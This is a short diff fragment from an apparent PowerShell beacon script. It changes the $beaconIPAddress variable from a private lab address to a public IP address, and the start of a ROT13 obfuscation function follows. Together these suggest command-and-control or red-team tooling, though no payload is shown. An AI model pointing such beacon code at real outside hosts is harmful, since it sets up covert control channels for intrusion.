@@ -3,7 +3,7 @@
 #    [string]$beaconIPAddress
 #)
 
-[String]$beaconIPAddress = "10.0.10.128"
+[String]$beaconIPAddress = "167.172.13.38"
 
 function Convert-ROT13 {
     param (
